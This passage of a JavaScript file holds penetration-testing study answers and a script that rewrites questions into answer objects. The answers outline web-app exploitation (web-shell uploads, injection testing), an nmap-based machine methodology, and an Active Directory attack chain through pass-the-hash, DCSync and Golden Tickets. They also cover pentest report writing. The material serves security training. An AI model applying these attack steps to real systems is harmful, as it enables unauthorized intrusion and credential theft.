  "Walk me through exploiting a web application": "1) Recon: Identify technology stack (Wappalyzer), crawl the app. 2) Mapping: Discover all endpoints, parameters, forms (Burp Spider). 3) Authentication Testing: Default creds, brute force, password policy. 4) Injection Testing: Test all inputs for SQLi, XSS, command injection. 5) Access Control: Test IDOR (change user IDs), privilege escalation (access admin functions). 6) Session Management: Analyze tokens, test session fixation, cookie security flags. 7) File Upload: Try uploading web shells (.php, .jsp). 8) SSRF: Test URL parameters for internal access. 9) Document everything with Burp history + screenshots.",
  
  // Misc question matches
  "What was your methodology for each HTB machine?": "Structured approach: 1) Full port scan: nmap -sC -sV -p- -oN nmap.txt target. 2) Enumerate each service methodically (HTTP→Gobuster/Nikto, SMB→enum4linux, etc.). 3) Research versions for CVEs (searchsploit). 4) Try default/common credentials. 5) Look for web vulnerabilities if HTTP present. 6) Gain initial foothold (exploit or credential access). 7) Enumerate from inside: LinPEAS/WinPEAS. 8) Escalate privileges. 9) Capture flags (user.txt, root.txt). 10) Document every step with screenshots for report.",
  "Document your complete methodology for each": "Per-machine documentation template: 1) Summary: OS, IP, difficulty, time spent. 2) Enumeration: Nmap results, service details. 3) Vulnerability Discovery: How vulnerability was found. 4) Exploitation: Step-by-step commands + screenshots. 5) Privilege Escalation: Vector used + commands. 6) Proof: Flag screenshots showing hostname + IP. 7) Remediation: How to fix discovered vulnerabilities. 8) Lessons Learned: What was new, what was challenging.",
  "What was the hardest part of your first active machine?": "Common challenges: 1) Incomplete enumeration — missing a service on a high port. 2) Rabbit holes — spending hours on the wrong vulnerability. 3) Unfamiliar services — not knowing how to enumerate specific protocols. 4) Privilege escalation — missing subtle misconfigurations. Key lesson: ENUMERATE EVERYTHING before trying to exploit. Run nmap -p- (all ports). Check every version against searchsploit. Try harder = enumerate harder.",
  "What sections does a professional pentest report have?": "1) Cover Page — client name, date, assessor info. 2) Table of Contents. 3) Executive Summary — non-technical, business impact, risk overview (for C-suite). 4) Scope & Methodology — what was tested, how, and timeline. 5) Findings Summary — table of all vulnerabilities with CVSS scores, sorted by severity. 6) Detailed Findings — per vulnerability: Description, Evidence, Impact, Reproduction Steps, Remediation. 7) Risk Matrix — visual risk distribution. 8) Appendices — tool output, full scan results, screenshots.",
  "What is an executive summary?": "An executive summary is a 1-page non-technical overview written for C-level executives who don't understand technical details. It includes: 1) Scope of the assessment. 2) Overall risk rating (Critical/High/Medium/Low). 3) Key findings in business language ('An attacker could access all customer records'). 4) Number of vulnerabilities by severity. 5) Top recommendations prioritized by risk. 6) Positive findings (what's working well). NO technical jargon, NO tool names, NO commands. Think: 'Would my non-technical CEO understand this?'",
  "Describe a full AD attack chain from initial access to domain admin": "1) Recon: Nmap port scan reveals SMB (445), LDAP (389), Kerberos (88). 2) Enumerate: enum4linux, ldapsearch for users. 3) Initial Access: AS-REP Roasting (GetNPUsers.py) or password spraying. 4) Foothold: Evil-WinRM or psexec with cracked creds. 5) Enum AD: BloodHound + SharpHound for attack paths. 6) Lateral Movement: Pass-the-Hash (crackmapexec), WMI, PSremoting. 7) Priv Esc: Kerberoasting (GetUserSPNs.py), find DA path in BloodHound. 8) Domain Admin: DCSync (secretsdump.py), dump NTDS.dit. 9) Persistence: Golden Ticket, new DA account. 10) Document everything with screenshots.",
  "What risk rating would you assign each vulnerability?": "Use CVSS v3.1: Critical (9.0-10.0): RCE, auth bypass, full compromise — immediate fix required. High (7.0-8.9): significant impact, exploitable with some conditions — fix within 1 week. Medium (4.0-6.9): requires specific conditions or user interaction — fix within 1 month. Low (0.1-3.9): minimal impact, informational — fix in next release cycle. Informational (0): best practice recommendations. Always include business context: a 'Medium' SQLi on an internal-only app might be lower priority than a 'Medium' on a customer-facing app.",
  "Does your report have executive summary, findings, and remediation?": "A complete pentest report must have ALL three: 1) Executive Summary — non-technical overview for management (1-2 pages). 2) Detailed Findings — each vulnerability with: title, CVSS score, description, evidence (screenshots), reproduction steps, business impact. 3) Remediation — specific, actionable fixes for each finding: code fixes, configuration changes, architecture improvements. Additional sections: Scope, Methodology, Risk Matrix, Appendices. Without all three, the report is incomplete and unprofessional.",
  "What was the hardest part of the medium machine?": "Common challenges in medium machines: 1) Less obvious initial foothold — may require chaining multiple vulnerabilities. 2) Custom/uncommon services requiring research. 3) More complex privilege escalation (not just basic SUID/sudo). 4) Rabbit holes designed to waste time. 5) Realistic configurations with some but not all hardening. Strategy: Time-box enumeration phases, take notes on everything found, look for connections between discovered information, don't tunnel vision on one approach."
};

// Count replacements
let replaceCount = 0;

// Process each question - replace string format with {q, a} format
for (const [question, answer] of Object.entries(answers)) {
  // Escape special regex characters in the question
  const escaped = question.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  
  // Match the string-only format: "question text"
  // But don't match if it's already in {q:, a:} format
  const pattern = new RegExp(`"${escaped}"`, 'g');
  
  // Build the replacement
  const safeQ = question.replace(/"/g, '\\"');
  const safeA = answer.replace(/"/g, '\\"').replace(/\n/g, '\\n');
  const replacement = `{"q": "${safeQ}", "a": "${safeA}"}`;
  
  const before = content;
  content = content.replace(pattern, replacement);
  if (content !== before) {
    replaceCount++;
  }
}

fs.writeFileSync(filePath, content, 'utf8');
console.log(`Done! Replaced ${replaceCount} questions with expert answers.`);
